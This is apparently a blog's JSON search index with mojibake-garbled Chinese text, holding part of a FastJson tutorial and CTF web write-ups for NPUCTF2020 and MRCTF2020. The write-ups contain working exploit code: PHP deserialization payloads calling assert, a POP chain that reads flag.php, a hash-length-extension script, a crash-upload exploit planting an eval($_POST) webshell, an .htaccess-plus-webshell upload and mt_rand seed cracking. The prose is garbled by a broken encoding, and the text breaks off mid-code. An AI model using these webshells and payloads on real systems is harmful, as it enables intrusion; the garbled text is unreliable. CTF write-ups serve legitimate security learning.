æƒ³æ§åˆ¶ï¼Œæœ€å¥½å°±å…¨éƒ¨éƒ½ä½¿ç”¨è¯¥å±æ€§ä¿®é¥°ï¼Œæˆ–è€…ä½ è‡ªå·±å¹²è„†å†™çš„æ—¶å€™å°±ä»ä¸Šå‘ä¸‹å†™ï¼Œä¸ç„¶çš„è¯ï¼Œé»˜è®¤ä»ä¸Šå‘ä¸‹æ‰§è¡Œï¼Œåªä¼šå†æŒ‰ç…§ordinalé™å®šçš„é¡ºåºæ’åˆ— ä¸Šè¿°ä»£ç è¾“å‡ºï¼š 12345678910[ &#123; &quot;DATE OF BIRTH&quot;:&quot;02/11/2020&quot;, &quot;FULL NAME&quot;:&quot;wndmd&quot; &#125;, &#123; &quot;DATE OF BIRTH&quot;:&quot;02/11/2020&quot;, &quot;FULL NAME&quot;:&quot;Json!&quot; &#125;] å¦‚æœå°†serializeçš„falseå»æ‰ä¹‹åï¼Œä»–è¿˜æ˜¯ç¬¬ä¸€ä¸ªè¢«æ‰§è¡Œï¼š 123456789101112[ &#123; &quot;Age&quot;:18, &quot;DATE OF BIRTH&quot;:&quot;02/11/2020&quot;, &quot;FULL NAME&quot;:&quot;wndmd&quot; &#125;, &#123; &quot;Age&quot;:20, &quot;DATE OF BIRTH&quot;:&quot;02/11/2020&quot;, &quot;FULL NAME&quot;:&quot;Json!&quot; &#125;] ä½œç”¨å¯¹è±¡@JSONField çš„ä½œç”¨å¯¹è±¡: Field Setter å’Œ Getter æ–¹æ³• éœ€è¦æ³¨æ„å¦‚ä¸‹ä¸¤ç‚¹ï¼š æ³¨æ„ï¼šFastJson åœ¨è¿›è¡Œæ“ä½œæ—¶ï¼Œæ˜¯æ ¹æ® getter å’Œ setter çš„æ–¹æ³•è¿›è¡Œçš„ï¼Œå¹¶ä¸æ˜¯ä¾æ® Field è¿›è¡Œã€‚ æ³¨æ„ï¼šè‹¥å±æ€§æ˜¯ç§æœ‰çš„ï¼Œå¿…é¡»æœ‰ set æ–¹æ³•ã€‚å¦åˆ™æ— æ³•ååºåˆ—åŒ–ã€‚ è·Ÿè¿›JSONFieldæŸ¥çœ‹æºç ï¼Œå¯ä»¥çŸ¥é“æˆ‘ä»¬å…è®¸æŒ‡å®šå¾ˆå¤šä¸œè¥¿=ã€‚=ï¼š 1234567891011121314151617181920212223242526272829public @interface JSONField &#123; int ordinal() default 0; String name() default &quot;&quot;; String format() default &quot;&quot;; boolean serialize() default true; //æ³¨æ„è¿™é‡Œï¼Œååºåˆ—åŒ–ï¼ boolean deserialize() default true; SerializerFeature[] serialzeFeatures() default &#123;&#125;; Feature[] parseFeatures() default &#123;&#125;; String label() default &quot;&quot;; boolean jsonDirect() default false; Class&lt;?&gt; serializeUsing() default Void.class; Class&lt;?&gt; deserializeUsing() default Void.class; String[] alternateNames() default &#123;&#125;; boolean unwrapped() default false; String defaultValue() default &quot;&quot;;&#125; é…ç½®æ–¹å¼FieldInfo å¯ä»¥é…ç½®åœ¨ getter/setter æ–¹æ³•æˆ–è€…å­—æ®µä¸Šã€‚ä¾‹å¦‚ï¼š é…ç½®åœ¨ getter/setter ä¸Š12345678public class A &#123; private int id; @JSONField(name=&quot;ID&quot;) public int getId() &#123;return id;&#125; @JSONField(name=&quot;ID&quot;) public void setId(int value) &#123;this.id = id;&#125;&#125; é…ç½®åœ¨ field ä¸Š1234567public class A &#123; @JSONField(name=&quot;ID&quot;) private int id; public int getId() &#123;return id;&#125; public void setId(int value) &#123;this.id = id;&#125;&#125; åˆ›å»º JSON å¯¹è±¡åˆ›å»º JSON å¯¹è±¡éå¸¸ç®€å•ï¼Œåªéœ€ä½¿ç”¨ JSONObjectï¼ˆfastJsonæä¾›çš„jsonå¯¹è±¡ï¼‰ å’Œ JSONArrayï¼ˆfastJsonæä¾›jsonæ•°ç»„å¯¹è±¡ï¼‰ å¯¹è±¡å³å¯ã€‚ è™½ç„¶JSONArryayä¹Ÿå¯ä»¥åˆ›å»ºä¸€ä¸ªJSONå¯¹è±¡ï¼Œä½†æˆ‘è§‰å¾—ä¹¦å†™æ–¹å¼ä¸å¤Ÿç¾è§‚ï¼Œå…¶ä¸­å¦‚ä¸‹ï¼š 123456789101112@Testpublic void whenGenerateJson_thanGenerationCorrect() throws ParseException &#123; JSONArray jsonArray = new JSONArray(); for (int i = 0; i &lt; 2; i++) &#123; JSONObject jsonObject = new JSONObject(); jsonObject.put(&quot;AGE&quot;, 10); jsonObject.put(&quot;FULL NAME&quot;, &quot;Doe &quot; + i); jsonObject.put(&quot;DATE OF BIRTH&quot;, &quot;2016/12/12 12:12:12&quot;); jsonArray.add(jsonObject); &#125; String jsonOutput = jsonArray.toJSONString();&#125; JSON å­—ç¬¦ä¸²è½¬æ¢ä¸º Java å¯¹è±¡fastjsonå…è®¸æˆ‘ä»¬å¯ä»¥å°†å‰ç«¯ä¼ æ¥çš„æ•°æ®è½¬æ¢å˜æˆJSONæ•°æ®ï¼ŒåŒæ ·çš„ä¹Ÿå…è®¸æˆ‘ä»¬æŠŠåç«¯æ•°æ®è½¬æ¢ä¸ºJSONå­—ç¬¦ä¸²ä¸¢ç»™å‰ç«¯ã€‚ 123456789101112 @Test public void jsonToJava()&#123; JavaToJson miaomiaomiao = new JavaToJson(21, &quot;miaomiaomiao&quot;, new Date()); String jsonObject = JSON.toJSONString(miaomiaomiao);// System.out.println(jsonObject);// è¿™å‰é¢çš„partæˆ‘ä»¬å°†æ•°æ®è½¬æ¢æˆäº†JSONæ•°æ® JavaToJson newJavaObject = JSON.parseObject(jsonObject,JavaToJson.class);// æŒ‡å®šéœ€è¦è½¬æ¢çš„JSONå­—ç¬¦ä¸²ï¼Œå¹¶ä¸”æŒ‡å®šåŸå‹,è¿™æ ·çš„è¯ä¸€ä¸ªJAVAå¯¹è±¡å°±æŒ‡å®šå¥½äº† System.out.println(newJavaObject.getAge()); System.out.println(newJavaObject.getFullName()); &#125; ä½¿ç”¨ContextValuFilteré…ç½®JSONè½¬æ¢åœ¨æœ‰äº›åœºæ™¯ä¸­ï¼Œå¯¹Valueåšè¿‡æ»¤ï¼Œéœ€è¦è·å¾—æ‰€è¿°JavaBeançš„ä¿¡æ¯ï¼Œè€Œæˆ‘ä»¬å¯èƒ½æƒ³è¦è¿‡æ»¤æŸäº›ä¿¡æ¯ï¼Œä¾¿å¯ä»¥ä½¿ç”¨è¯¥æ–¹æ³•è¿›è¡Œæ“ä½œäº†ã€‚ 123456789101112131415161718192021222324@Before public void before()&#123; listOfJava.add(new JavaToJson(31,&quot;wdnmd&quot;,new Date())); listOfJava.add(new JavaToJson(33,&quot;wd&quot;,new Date())); &#125; @Test public void givenContextFilter_whenJavaObject_thanJsonCorrect() &#123; ContextValueFilter valueFilter = new ContextValueFilter () &#123; public Object process( BeanContext context, Object object, String name, Object value) &#123; if (name.equals(&quot;DATE OF BIRTH&quot;)) &#123; return &quot;NOT TO DISCLOSE&quot;; &#125; if (value.equals(&quot;wdnmd&quot;)) &#123; return ((String) value).toUpperCase(); &#125; else &#123; return null; &#125; &#125; &#125;; String jsonOutput = JSON.toJSONString(listOfJava, valueFilter); System.out.println(jsonOutput); &#125; ç»è¿‡ä¸Šè¿°ä»£ç çš„æ“ä½œï¼Œæˆ‘ä»¬çš„æ—¶é—´å°†ä¼šä¿®æ”¹ä¸ºNOT TO DISCLOSEï¼Œå¹¶ä¸”æ•°æ®ä¸­ä¸åŒ…å«wdnmdçš„å°†ä¼šè¢«è¿‡æ»¤,å…·ä½“è¾“å‡ºå¦‚ä¸‹ï¼š 1234567891011121314[ &#123; &quot;DATE OF BIRTH&quot;:&quot;NOT TO DISCLOSE&quot; &#125;, &#123; &quot;DATE OF BIRTH&quot;:&quot;NOT TO DISCLOSE&quot; &#125;, &#123; &quot;DATE OF BIRTH&quot;:&quot;NOT TO DISCLOSE&quot;,&quot;FULL NAME&quot;:&quot;wdnmd&quot; &#125;, &#123; &quot;DATE OF BIRTH&quot;:&quot;NOT TO DISCLOSE&quot; &#125;]","categories":[],"tags":[{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"http://example.com/tags/%E5%BC%80%E5%8F%91/"},{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"}]},{"title":"NPUCTF2020","slug":"NPUCTF2020","date":"2020-10-30T01:00:15.000Z","updated":"2020-10-31T07:01:18.480Z","comments":true,"path":"2020/10/30/NPUCTF2020/","link":"","permalink":"http://example.com/2020/10/30/NPUCTF2020/","excerpt":"","text":"webğŸ•åˆ—è¡¨å†…å®¹å¤åˆ¶ç²˜è´´ï¼Œä¸¢pythoné‡Œé¢è·‘ä¸€è½®å°±è¡Œäº† 123list = [102, 108, 97, 103, 123, 119, 101, 54, 95, 52, 111, 103, 95, 49, 115, 95, 101, 52, 115, 121, 103, 48, 105, 110, 103, 125]for i in list: print(chr(i),end=&#x27;&#x27;) å•Šï¼Œåˆ«çœ‹äº†ï¼Œè¿™ä¸Šé¢å¤ªä¸¢äººäº†ã€‚ã€‚ã€‚åŸæ¥æ˜¯å› ä¸ºè¿™æ˜¯æœ€åä¸€æ­¥ï¼Œ ReadlezPHPè¿™é“é¢˜ç›®å’Œä¹‹å‰åœ¨ç½‘é¼æ¯åšçš„phpwebå¾ˆåƒï¼Œä¸€æ ·çš„æ˜¯è¿›è¡ŒåŠ¨è°ƒï¼š 12345678910111213141516171819202122232425&lt;?php#error_reporting(0);class HelloPhp&#123; public $a; public $b; public function __construct()&#123; $this-&gt;a = &quot;Y-m-d h:i:s&quot;; $this-&gt;b = &quot;date&quot;; &#125; public function __destruct()&#123; $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); &#125;&#125;$c = new HelloPhp;if(isset($_GET[&#x27;source&#x27;]))&#123; highlight_file(__FILE__); die(0);&#125;@$ppp = unserialize($_GET[&quot;data&quot;]); flagè¯´æ˜¯åœ¨phpinfoå½“ä¸­,æ„é€ å¦‚ä¸‹ï¼š 12345678910111213141516171819&lt;?php#error_reporting(0);class HelloPhp&#123; public $a; public $b; public function __construct()&#123; $this-&gt;a = &quot;phpinfo()&quot;; $this-&gt;b = &quot;assert&quot;; &#125; public function __destruct()&#123; $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); &#125;&#125;$a = new HelloPhp();echo serialize($a); Ezinclude ç¬¬ä¸€æ­¥ï¼Œè¿™é‡Œè¯´æ˜¯cookiesé‡Œé¢æœ‰ä¸€ä¸ªhashï¼Œæ˜¯hashæ‹“å±•æ”»å‡»ï¼š 123456789101112131415import requestsimport hashpumpyimport urlliburl=&#x27;http://ha1cyon-ctf.fun:30004/&#x27;for i in range(40): a,b=hashpumpy.hashpump(&#x27;a3dabbc779f2fbf8b6f56113ca78a7f9&#x27;,&#x27;123444&#x27;,&#x27;1&#x27;,i) req=requests.get(url+&quot;name=&#123;&#125;&amp;pass=&#123;&#125;&quot;.format(urllib.parse.quote(b),a)) if &#x27;username/password error&#x27; not in req.text: print(req.text,url+&quot;name=&#123;&#125;&amp;pass=&#123;&#125;&quot;.format(urllib.parse.quote(b),a)) ?ç„¶è€Œå®é™…åšçš„æ—¶å€™æŠŠcookiesçš„å€¼ä¸¢è¿›å»å½“ä½œpasswordçš„å°±è¿‡å»äº†ã€‚ è¯»å–åˆ°ä¸‰ä¸ªphpæ–‡ä»¶ï¼š flflflflag.php 12345678&lt;?php$file=$_GET[&#x27;file&#x27;];if(preg_match(&#x27;/data|input|zip/is&#x27;,$file))&#123; die(&#x27;nonono&#x27;);&#125;@include($file);echo &#x27;include($_GET[&quot;file&quot;])&#x27;;?&gt; index.php 123456789101112131415161718&lt;?phpinclude &#x27;config.php&#x27;;@$name=$_GET[&#x27;name&#x27;];@$pass=$_GET[&#x27;pass&#x27;];if(md5($secret.$name)===$pass)&#123; echo &#x27;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt; window.location.href=&quot;flflflflag.php&quot;; &lt;/script&gt;&#x27;;&#125;else&#123; setcookie(&quot;Hash&quot;,md5($secret.$name),time()+3600000); echo &quot;username/password error&quot;;&#125;?&gt;&lt;html&gt;&lt;!--md5($secret.$name)===$pass --&gt;&lt;/html&gt; config.php 1234&lt;?php$secret=&#x27;%^$&amp;$#fffdflag_is_not_here_ha_ha&#x27;;?&gt; ç”¨dirbè¿˜èƒ½æ‰«å‡ºæ¥ä¸€ä¸ªdir.php 123456789&lt;body&gt; array(2) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; &#125; include($_GET[&quot;file&quot;])&lt;/body&gt; è¿™é‡Œä¼šåˆ—å‡ºtmpç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œ é‚£çœ‹æ¥è¿˜æ˜¯è¦å†™ğŸè¿›å»å•Šï¼Œå¯æ˜¯ä¼ªåè®®è¢«è¿‡æ»¤äº†è¯¥æ€ä¹ˆå†™ğŸå‘¢ï¼Ÿ å‚è€ƒæ–‡ç« ï¼š 1https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;183046 ä»è¿™ç¯‡æ–‡ç« ä¸­æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œå½“PHPé™·å…¥å´©æºƒçš„æ—¶å€™ä»–ä¼šè‡ªåŠ¨çš„é‡å¯ï¼Œæ¸…ç†æ‰è‡ªå·±çš„å†…å­˜ï¼Œä½†æ˜¯ä¸æ­¤åŒæ—¶è¿™å°±ä¼šå¯¼è‡´PHPä¼šåœæ­¢è‡ªå·±æ‰‹å¤´çš„å·¥ä½œï¼Œè¿™æ ·çš„è¯äºæ­¤åŒæ—¶æˆ‘ä»¬ç›´æ¥POSTä¸€æ®µæ•°æ®ï¼Œå°†ä¼šè¢«phpä¿å­˜è‡³tmpç›®å½•ä¸‹æ²¡æœ‰åœä¸‹ã€‚éšæœºç”Ÿæˆä¸€ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯åˆæ ¹æ®é¢˜ç›®çš„dir.phpï¼Œå¯ä»¥è®©æˆ‘ä»¬çœ‹è§tmpç›®å½•ä¸‹æœ‰ä»€ä¹ˆï¼Œæ‰€ä»¥ç›´æ¥åŒ…è£¹å³å¯~ æŠ„æ¥çš„expï¼š 123456789101112import requestsfrom io import BytesIOimport repayload = &quot;&lt;?php eval($_POST[a]);?&gt;&quot;file_data=&#123; &#x27;file&#x27;: BytesIO(payload.encode())&#125;url=&quot;http://a53738f6-1115-449b-b4af-167a2c1a5b1a.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;try: r=requests.post(url=url,files=file_data,allow_redirects=False)except: print(1) é‡ç‚¹å°±æ˜¯ç”¨string.strip_tagsè¿™ä¸€ç‚¹æ„é€ å‡ºphpçš„å†…å­˜æº¢å‡ºå³å¯å¾—åˆ°ã€‚ä¹‹åè®¿é—®dir.phpå¯ä»¥çœ‹è§æœ‰ä»€ä¹ˆæ–‡ä»¶æˆåŠŸä¸Šä¼ ï¼š è¿›è¡Œæ–‡ä»¶åŒ…å«å³å¯ flagä¸€æ ·çš„PHP infoï¼ˆï¼‰å½“ä¸­","categories":[],"tags":[]},{"title":"MRCTF2020","slug":"MRCTF2020","date":"2020-10-29T09:51:51.000Z","updated":"2020-10-29T12:44:36.831Z","comments":true,"path":"2020/10/29/MRCTF2020/","link":"","permalink":"http://example.com/2020/10/29/MRCTF2020/","excerpt":"","text":"æ€ä¹ˆè¯´å‘¢ã€‚ã€‚æ˜¯æ–°æ‰‹é¢˜ç›®ï¼Œåˆä¸å¤ªåƒï¼Œæœ‰äº›é¢˜ç›®è„‘æ´æœ‰ç‚¹å¤§ 1.å¥—å¨ƒè¯»æºç ï¼š 12345678$query = $_SERVER[&#x27;QUERY_STRING&#x27;]; if( substr_count($query, &#x27;_&#x27;) !== 0 || substr_count($query, &#x27;%5f&#x27;) != 0 )&#123; die(&#x27;Y0u are So cutE!&#x27;);&#125; if($_GET[&#x27;b_u_p_t&#x27;] !== &#x27;23333&#x27; &amp;&amp; preg_match(&#x27;/^23333$/&#x27;, $_GET[&#x27;b_u_p_t&#x27;]))&#123; echo &quot;you are going to the next ~&quot;;&#125; å…¶ä¸­å¯ä»¥çœ‹è§è¿‡æ»¤_å’Œ%5fï¼Œé‚£æˆ‘ä»¬ç¼–ç ç»•è¿‡å°±æ— åŠæ³•äº†å•Šï¼Œä½†æ˜¯æ‰¾åˆ°å‚è€ƒæ–‡çŒ®ï¼š 1https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;213359.html å…¶ä¸­å¯¹è¿™ç§çš„ç»•è¿‡ äºæ˜¯æˆ‘ä»¬æ„é€ ç©ºæ ¼æ¥ç»•è¿‡ï¼š 1&#x2F;?b%20u%20p%20t&#x3D;23333%0a ä¹‹ååœ¨secrettw.phpä¸­ï¼ŒJSfcukç¿»è¯‘å³å¯å¾—åˆ°è®©ä¼ å€¼è¯»å–æºç ï¼š è¯»å–åˆ°æºç å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728&lt;?php error_reporting(0); include &#x27;takeip.php&#x27;;ini_set(&#x27;open_basedir&#x27;,&#x27;.&#x27;); include &#x27;flag.php&#x27;;if(isset($_POST[&#x27;Merak&#x27;]))&#123; highlight_file(__FILE__); die(); &#125; function change($v)&#123; $v = base64_decode($v); $re = &#x27;&#x27;; for($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr ( ord ($v[$i]) + $i*2 ); &#125; return $re; &#125;echo &#x27;Local access only!&#x27;.&quot;&lt;br/&gt;&quot;;$ip = getIp();if($ip!=&#x27;127.0.0.1&#x27;)echo &quot;Sorry,you don&#x27;t have permission! Your ip is :&quot;.$ip;if($ip === &#x27;127.0.0.1&#x27; &amp;&amp; file_get_contents($_GET[&#x27;2333&#x27;]) === &#x27;todat is a happy day&#x27; )&#123;echo &quot;Your REQUEST is:&quot;.change($_GET[&#x27;file&#x27;]);echo file_get_contents(change($_GET[&#x27;file&#x27;])); &#125;?&gt; å…¶ä¸­å¯¹IPè¿›è¡Œäº†ä¸€æ¬¡checkï¼ŒXFFä¸å¯ç”¨ï¼Œç”¨Clinet-IPå³å¯ç»•è¿‡ ä¹‹åçœ‹ä¸Šé¢çš„ç®€å•å‡½æ•°çš„é€†å‘ï¼ŒæŠŠåŠ å·æ”¹æˆå‡å·å°±è¡Œäº† 1234567891011121314151617181920&lt;?php$v = &quot;fj]a&amp;f\\b&quot;;function unchange($v)&#123; $re = &#x27;&#x27;; for($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr ( ord ($v[$i]) - $i*2 ); &#125; return $re;&#125;function change($v)&#123; $v = base64_decode($v); $re = &#x27;&#x27;; for($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr ( ord ($v[$i]) + $i*2 ); &#125; return $re;&#125;echo (change(&quot;ZmpdYSZmXGI=&quot;)); æ¯”è¾ƒæ¶å¿ƒåˆ°äººçš„æ˜¯2333çš„è¾“å‡ºï¼Œæˆ‘ä¹‹å‰æ— è®ºå¦‚ä½•è¾“å…¥éƒ½ä¸è¡Œï¼Œä¸€åº¦æ€€ç–‘äººç”Ÿï¼Œæœ€åæ‰¾åˆ°dataçš„ä¼ªåè®®å¯ä»¥ç»•è¿‡ï¼Œå‚è€ƒæ–‡ç« ï¼š 1https:&#x2F;&#x2F;blog.csdn.net&#x2F;nzjdsds&#x2F;article&#x2F;details&#x2F;82461043 æœ€åæˆåŠŸæ‹¿åˆ°flagï¼Œflagåœ¨æºç ä¸­ï¼š 2.ä½ ä¼ ä½ ğŸå‘¢åˆ†åˆ«ä¸Šä¼ .htaccesså’Œä¸€å¥è¯å³å¯ï¼š ä¸€å¥è¯ç”¨aspçš„æ ¼å¼ï¼š 1&lt;script language=&quot;php&quot;&gt;eval($_POST[1]);&lt;/script&gt; ä¹‹åç”¨èšå‰‘ğŸ”—æ‹¿flagå³å¯ï¼Œè¿™é“é¢˜æˆ‘æ¯”è¾ƒå¥‡æ€ªçš„å°±æ˜¯è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ï¼Œä½†æ˜¯åˆæ²¡å•¥ç”¨,æˆ‘çŒœæµ‹æ˜¯å‡ºé¢˜äººè¿‡æ»¤ä¸å¤Ÿï¼Ÿä¸ç„¶å¯ä»¥ç”¨disable_functionçš„æ¥åšçš„,è¿‡æ»¤å¦‚ä¸‹ï¼škâ€™hâ€™j 1pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld 3.Ez_bypassMD5å¼ºç­‰äºç»•è¿‡å’Œå¼±ç­‰äºç»•è¿‡ï¼š å½“ç„¶ä¹Ÿå¯ä»¥ç”¨ä¸‹é¢è¿™ä¸¤ç»„æ•°ï¼š 123hexString1 = &#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&#x27;hexString2 = &#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&#x27; ç¬¬äºŒæ­¥ï¼› 4.PYWebsite çœ‹åˆ°è¿™å¥è¯ï¼Œç›´æ¥ä¼ªé€ XFFå³å¯ 5.Ezpopé¦–å…ˆå®¡è®¡æºç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier &#123; protected $var; public function append($value)&#123; include($value); &#125; public function __invoke()&#123; $this-&gt;append($this-&gt;var); &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file=&#x27;index.php&#x27;)&#123; $this-&gt;source = $file; echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;; &#125; public function __toString()&#123; return $this-&gt;str-&gt;source; &#125; public function __wakeup()&#123; if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;class Test&#123; public $p; public function __construct()&#123; $this-&gt;p = array(); &#125; public function __get($key)&#123; $function = $this-&gt;p; return $function(); &#125;&#125;if(isset($_GET[&#x27;pop&#x27;]))&#123; @unserialize($_GET[&#x27;pop&#x27;]);&#125;else&#123; $a=new Show; highlight_file(__FILE__);&#125; æˆ‘è‡ªå·±å®¡è®¡çš„æ—¶å€™æ„Ÿè§‰æœ‰ç‚¹æ‡µï¼Œé¦–å…ˆæˆ‘ä»¬å¯èƒ½è¦ç”¨åˆ°çš„æ˜¯includeè¿™ä¹ˆä¸€ä¸ªå‡½æ•°ï¼Œè€Œvarå‡½æ•°ä¼šåœ¨__invokeçš„æ—¶å€™å»è°ƒç”¨$varï¼Œè¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œäºæ˜¯æˆ‘ä»¬æ„é€ å¦‚ä¸‹ï¼š 1$var=&quot;php://filter/convert.base64-encode/resource=flag.php&quot;; æ¥ç€å°±æ˜¯å»æ‰¾å“ªé‡Œå¯ä»¥è°ƒç”¨åˆ°è¿™ä¹ˆä¸€ä¸ª__invokeæ–¹æ³•äº†ï¼Œæ ¹æ®PHPçš„æ‰‹å†Œï¼Œæˆ‘ä»¬ä¼šåœ¨ å‡½æ•°è¢«å½“æˆæ–¹æ³•è°ƒç”¨çš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨ï¼Œä¾‹å­å¦‚ä¸‹ï¼š 123$mod = new Modifier();$mod();//åœ¨ä¸‹é¢åˆ™ä¼šè‡ªåŠ¨è°ƒç”¨invokeæ–¹æ³• å¾€ä¸‹çœ‹å°±èƒ½çœ‹è§Testæ–¹æ³•ï¼Œå› ä¸ºå®ƒè¿”å›äº†ä¸€ä¸ªfunctionã€‚æ‰€ä»¥è®©Testå»get ä¸€ä¸‹Modifierç±»ï¼Œå°±ä¼šå…ˆè°ƒç”¨__getæ–¹æ³•ï¼Œç»“æœå› ä¸ºè¢«å½“æˆäº†å‡½æ•°è¿›è¡Œè°ƒç”¨ï¼Œæˆ‘ä»¬çš„Modifierç±»è‡ªåŠ¨çš„è°ƒç”¨äº†invokeæ–¹æ³•ã€‚ ç„¶åæˆ‘å¡åœ¨è¿™é‡Œå¥½ä¹…..æœ€åçœ‹äº†å¸ˆå‚…ä»¬çš„åšå®¢æ‰æƒ³åˆ°è¯¥æ€ä¹ˆå†™..è¯´å®è¯è¿˜æ˜¯æœ‰ç‚¹æ‡µé€¼ 1234567891011 public function __toString()&#123; return $this-&gt;str-&gt;source; &#125; public function __wakeup()&#123; if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125; åœ¨showå‡½æ•°å½“ä¸­ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°__wakeupå‡½æ•°ï¼Œå› ä¸ºå®ƒè¿›è¡Œäº†echoæ“ä½œï¼Œæ­¤æ—¶ä¾¿ä¼šè§¦å‘stringå‡½æ•° ä¿®æ”¹sourceçš„å€¼ã€‚ æœ€åè¦æ³¨æ„protectedå±æ€§ä¿®é¥°çš„å˜é‡åº”è¯¥ç”¨urlencodeè¿›è¡Œä¿®é¥°é¿å…ä¸å¯è§å­—ç¬¦ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpclass Modifier &#123; protected $var=&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;&#125;class Show&#123; public $source; public $str; public function __construct($file=&#x27;index.php&#x27;)&#123; $this-&gt;source = $file; &#125; public function __wakeup()&#123;// phpinfo(); if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;class Test&#123; public $p;// private $c; public function __construct()&#123; $this-&gt;p = array(); &#125; public function __get($key)&#123;// phpinfo(); $function = $this-&gt;p; return $function(); &#125;&#125;$test = new Test();$mod = new Modifier();$show1 = new Show();$show1 -&gt;str =$test;$show1-&gt;str-&gt;p = $mod;$show2 = new Show($show1);echo urlencode(serialize($show2));//å½“æˆ‘ä»¬è§¦å‘ è¿™é‡Œå°±æ˜¯è¿›è¡Œäº†ä¸€ä¸ªå¥—å¨ƒï¼Œå½“ååºåˆ—åŒ–çš„æ—¶å€™å‘¢ï¼Œshowæ–¹æ³•è¢«ååºåˆ—åŒ–ï¼Œè°ƒç”¨äº†wakeupçš„å‡½æ•°ï¼Œä¹‹ååˆå› ä¸º __construct,è¿›è¡Œäº†ä¸€å¥è¾“å‡ºï¼Œæ‰€ä»¥å°±é€ æˆäº†toStringè°ƒç”¨ï¼Œåœ¨æ­¤ä¹‹å‰æˆ‘ä»¬æ„é€ å¥½è¯­å¥å³å¯ $show2 çº¯ç²¹çš„æ˜¯è¿›è¡Œä¸€æ¬¡wakeupè°ƒç”¨ï¼ 6.Ezadulté¡µé¢å•¥ä¹Ÿçœ‹ä¸å‡ºæ¥ï¼Œç›´æ¥www.zipä¸‹äº†ä¸€æ³¢ä»£ç ï¼Œä¹‹åå‘ç°æ˜¯ä¼ªéšæœºæ•°çˆ†ç ´ï¼Œæ„é€ ä¸¤ä¸ªè„šæœ¬ï¼š 123456789101112str1 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;str2 = &#x27;KVQP0LdJKRaV3n9D&#x27;str3 = str1[::-1]res = &#x27;&#x27;for i in range(len(str2)): for j in range(len(str1)): if str2[i] == str1[j]: res += str(j) + &#x27; &#x27; + str(j) + &#x27; &#x27; + &#x27;0&#x27; + &#x27; &#x27; + str(len(str1) - 1) + &#x27; &#x27; breakprint(res)#ç»“æœ 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61 ä¸‹è½½php_mt_randé‚£ä¸ªè„šæœ¬ï¼Œä½¿ç”¨æ•™ç¨‹ï¼š è®°å¾—ç”¨makeç¼–è¯‘cè¯­è¨€çš„ä¸œè¥¿ï¼Œä¹‹å./è¿è¡Œå³å¯ï¼š è·‘å‡ºå…¬é’¥æ¥ï¼š1775196155 12345678910111213141516171819202122&lt;?phpmt_srand(1775196155);//å…¬é’¥function public_key($length = 16) &#123; $strings1 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;; $public_key = &#x27;&#x27;; for ( $i = 0; $i &lt; $length; $i++ ) $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1); return $public_key;&#125;//ç§é’¥function private_key($length = 12) &#123; $strings2 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;; $private_key = 